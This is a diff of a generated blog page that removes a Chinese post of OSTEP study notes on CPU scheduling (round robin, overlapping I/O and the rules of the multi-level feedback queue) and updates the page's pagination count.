-<p>考虑到响应时间，上述的算法表现都不尽如人意，在上例中，用户要至少要等待10s才能得到任务C的响应，而这显然是对于交互不友好的，我们需要引入新的调度算法来解决这个问题——</p>
-<h4 id="轮循-Round-Robin"><a href="#轮循-Round-Robin" class="headerlink" title="轮循(Round Robin)"></a>轮循(Round Robin)</h4><p>轮循的基本思想按照<strong>时间分片</strong>(<strong>Time Slice</strong>)或者说<strong>调度量子</strong>(<strong>Scheduling Quantum</strong>)来循环执行任务而不是运行任务直到完成。</p>
-<p>假设有A、B、C三个任务，它们同时到达系统而且均运行5s，假设时间分片为1s，在这种情况下，操作系统首先运行A，1s后切换到B，B运行1s后再切换到C，然后再循环回A。这样，平均响应时间为(0+1+2)/3=1s；而在SJF下，平均响应时间为(0+5+10)/3=5s。</p>
-<blockquote>
-<p>需要权衡时间分片的大小，如果时间分片过小，那么操作系统执行上下文切换的开销会显著增加。</p>
-</blockquote>
-<p>在RR下，平均周转时间会变得非常糟糕。事实上，公平性和性能在调度中是矛盾的，任何注重公平性的调度算法（即拥有良好的响应时间）在性能上（即周转时间）都会表现的很差。这是固有的权衡，<strong>鱼和熊掌不可兼得</strong>。</p>
-<h4 id="合并I-O"><a href="#合并I-O" class="headerlink" title="合并I/O"></a>合并I/O</h4><p>接下来我们放宽假设3，即任务除了使用CPU外，还可能执行I/O请求，在发起了I/O请求后，任务将不会使用CPU，并且将处于阻塞的状态以等待I/O完成。</p>
-<p>调度器需要决定I/O请求启动时是否切换至另一个任务，以及I/O完成时是执行当前任务还是切换回之前阻塞的任务。</p>
-<p>假设我们正试图建立一个STCF调度器，假设A和B两个任务均运行50ms，并且A每10ms会发起一个花费10ms的I/O请求。在这种情况下，通常的解决方法是将A划分为5个独立的子任务，这样，当A发起I/O请求并且阻塞之后，B就可以被执行，而当I/O完成后，新的A的子任务会抢占B而继续执行。</p>
-<p>上述的做法允许了<strong>重叠</strong>(<strong>Overlap</strong>)的发生，系统得以更好的利用处理器资源。</p>
-<h4 id="多级反馈队列-Multi-Level-Feedback-Queue"><a href="#多级反馈队列-Multi-Level-Feedback-Queue" class="headerlink" title="多级反馈队列(Multi-Level Feedback Queue)"></a>多级反馈队列(Multi-Level Feedback Queue)</h4><p>最后，我们将放宽限制4，即系统不知道每个任务的运行时间。在这种情况下，我们将引入最有名的调度器之一——多级反馈队列来解决该问题。多级反馈队列试图在提升性能（即缩短平均周转时间）的同时最小化任务的响应时间。首先，我们将介绍有关多级反馈队列的最基本的概念。</p>
-<h5 id="MLFQ-基本规则"><a href="#MLFQ-基本规则" class="headerlink" title="MLFQ:基本规则"></a>MLFQ:基本规则</h5><p>多级反馈队列(MLFQ)具有一系列相互独立的<strong>队列</strong>(<strong>Queue</strong>)，每一个队列都对应着不同的<strong>优先级</strong>(<strong>Priority Level</strong>)，在同一时间，一个任务只会处在一个队列中。</p>
-<p>MLFQ根据优先级决定运行哪一个任务：即具有更高优先级的任务会被运行。</p>
-<p>同时，考虑到可能会有多个任务处于同一个队列，即有可能出现相同优先级的情况，在这种情况下，MLFQ以轮循的方式运行这些任务。</p>
-<p>因此我们得到了如下的基本规则：</p>
-<ul>
-<li>如果A的优先级大于B的优先级，运行A(B不运行)</li>
-<li>如果A和B的优先级相同，以轮循的方式运行A和B</li>
-</ul>
-<p>假设两个任务A和B，A和B位于最高的优先级，而C和D位于次高的优先级，那么我们会发现，A和B会一直被运行，而C和D将永远无法被运行。</p>
-<h5 id="尝试1-如何改变优先级"><a href="#尝试1-如何改变优先级" class="headerlink" title="尝试1:如何改变优先级"></a>尝试1:如何改变优先级</h5><p>MLFQ依据已经观察到的结果确定一个任务的优先级：如果一个任务在一个相当长的周期内一直在使用CPU，那么MLFQ会降低它的优先级，如果一个任务周期性的放弃CPU而等待用户的输入，那么MLFQ会维持它的优先级，因为这样的任务是一个活跃的任务。</p>
-<p>因此我们得到了如下的规则：</p>
-<ul>
-<li>当一个任务进入系统时，它将会被放置在优先级最高的队列</li>
-<li>a如果一个任务在运行中占用了一个完整的时间分片，那么它的优先级会被降低</li>
-<li>b如果一个任务在时间分片用完前放弃了CPU，那么它的优先级维持不变</li>
-</ul>
-<p>在上述的规则中，我们考虑如下的两个问题：</p>
-<ul>
-<li>如果有太多的活跃任务，那么他们会占用所有的CPU时间，那么，长时间运行的任务将永远不会得到任何的CPU时间。</li>
-<li>程序可以以在时间分片用完前“故意”地放弃CPU以欺骗操作系统而使得其保持高优先级</li>
-</ul>
-<h5 id="尝试2-优先级提高"><a href="#尝试2-优先级提高" class="headerlink" title="尝试2:优先级提高"></a>尝试2:优先级提高</h5><p>我们引入如下的规则来解决上面提到的问题1：</p>
-<ul>
-<li>在某个时间周期S之后，将系统中所有的任务提升至优先级最高的队列</li>
-</ul>
-<p>通过该规则，过多的活跃进程并不会完全占用CPU的时间，此外，当一个程序从不活跃转变为活跃时也能够及时得得到响应的CPU时间。</p>
-<h5 id="尝试3-更好的计量"><a href="#尝试3-更好的计量" class="headerlink" title="尝试3:更好的计量"></a>尝试3:更好的计量</h5><p>我们引入如下的规则来解决上面提到的问题2:</p>
-<ul>
-<li>一旦某个任务用完了在给定优先级下的分配时间，无论它已经放弃了多少次CPU，降低它的优先级。</li>
-</ul>
-<p>这么做避免了一个任务欺骗操作系统，避免了其通过不公正的手段分享CPU的时间。</p>
-
-                    
-                        
-
-                    
-                    
-                        <p>
-                            <a href="/2016/12/12/OSTEP学习笔记1/#post-footer" class="postShorten-excerpt_link link">
-                                评论和共享
-                            </a>
-                        </p>
-                    
-                </div>
-            
-        </div>
-        
-    </article>
-    
     <div class="pagination-bar">
     <ul class="pagination">
         
@@ -1981,7 +1993,7 @@
             </a>
           </li>
         
-        <li class="pagination-number">第 2 页 共 3 页</li>
+        <li class="pagination-number">第 2 页 共 4 页</li>
     </ul>
 </div>
 
